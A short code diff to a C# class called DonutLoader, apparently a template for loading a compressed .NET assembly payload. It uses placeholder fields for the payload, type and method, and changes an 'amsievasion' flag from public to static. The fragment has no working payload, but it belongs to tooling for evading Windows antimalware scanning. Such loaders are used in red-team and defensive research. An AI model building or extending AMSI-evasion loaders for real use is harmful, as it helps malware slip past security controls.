@@ -10,7 +10,7 @@ class DonutLoader
     static string payload64 = @"#COMPRESSEDASSEMBLY#";
     static string type = "#TYPE#";
     static string method = "#METHOD#";
-    public bool amsievasion = true;
+    static bool amsievasion = true;
 
     static void Main(string[] args)
     {
